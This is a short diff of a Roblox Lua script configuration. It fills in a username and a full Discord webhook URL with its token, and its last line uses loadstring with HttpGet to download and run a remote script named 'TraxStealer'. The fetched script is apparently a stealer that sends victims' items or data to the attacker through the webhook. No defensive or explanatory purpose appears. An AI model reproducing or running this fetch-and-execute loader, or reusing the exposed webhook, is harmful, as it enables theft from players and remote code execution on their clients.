@@ -1,4 +1,4 @@
-Username = "your roblox username"
-Webhook = "Your Webhook"
+Username = "arigaming1925"
+Webhook = "https://discord.com/api/webhooks/1349395071786680395/IK9_mk806b1BtVmbAioXZWVh0HbZXlW8xJkQDGBqtYA95ehEwX8sDt4ava2YC_Q10vNk"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PlsDonate/refs/heads/main/TraxStealer"))()
